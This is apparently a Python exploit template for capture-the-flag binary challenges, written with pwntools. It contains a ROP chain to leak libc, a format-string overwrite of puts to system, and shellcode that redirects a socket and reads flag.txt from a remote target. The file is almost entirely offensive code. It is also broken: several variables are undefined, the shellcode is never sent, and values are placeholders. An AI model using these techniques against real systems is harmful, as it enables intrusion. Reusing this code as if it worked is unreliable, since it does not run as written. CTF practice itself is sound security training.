#!/usr/bin/env python
from sc_expwn import *

bin_file = './pwn'
context(os = 'linux', arch = 'i386')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target.com', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.19.so_remote')
env.select('local')

#==========

binf = ELF(bin_file)
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc

#==========

def attack(conn):
    pwn = Pwn(conn)

    success('success    = 0x{:08x}'.format(0xdeadbeef))
    info('information   = 0x{:08x}'.format(0xdeadbeef))
    warn('waring        = 0x{:08x}'.format(0xcafebabe))
    debug('debug        = 0x{:08x}'.format(0xcafebabe))
    
    # ROP
    rop = ROP(binf)
    rop.printf(addr_got_printf)
    rop.main()
    rop.raw(rop.ebp)
    rop.raw(0xcafebebe)
    rop.raw(rop.ret_4)
    rop.raw(0xdeadbeef)
    rop.raw(addr_main)
    conn.sendline(str(rop))

    # libc
    addr_libc_printf    = u32(conn.recv(4))
    libc.address        = addr_libc_printf - offset_libc_printf
    info('addr_libc_base = 0x%08x' % libc.address)
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    # FSB
    overwrite[addr_got_puts] = addr_libc_system
    payload  = 'hoge'
    payload += fmtstr_payload(5, overwrite, numbwritten = len(payload), write_size = 'short')

    # shellcode
    args = {'addr':0xdeadbeef, 'size':0x100}
    shellasm = '''
    mov eax, SYS_write
    mov ebx, STDOUT_FILENO
    mov ecx, {addr}
    mov edx, {size}
    int 0x80
    '''.format(**args)
    
    shellasm += shellcraft.dup2(4,0)
    shellasm += shellcraft.dup2(4,1)
    shellasm += shellcraft.open('flag.txt')
    shellasm += shellcraft.read('eax', addr_bss, 0x500)
    shellasm += shellcraft.write('STDOUT_FILENO', addr_bss, 'eax')

    shellcode = asm(shellasm)
    
class Pwn:
    def __init__(self, conn):
        self.recvuntil  = conn.recvuntil
        self.recv       = conn.recv
        self.sendline   = conn.sendline
        self.send       = conn.send

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
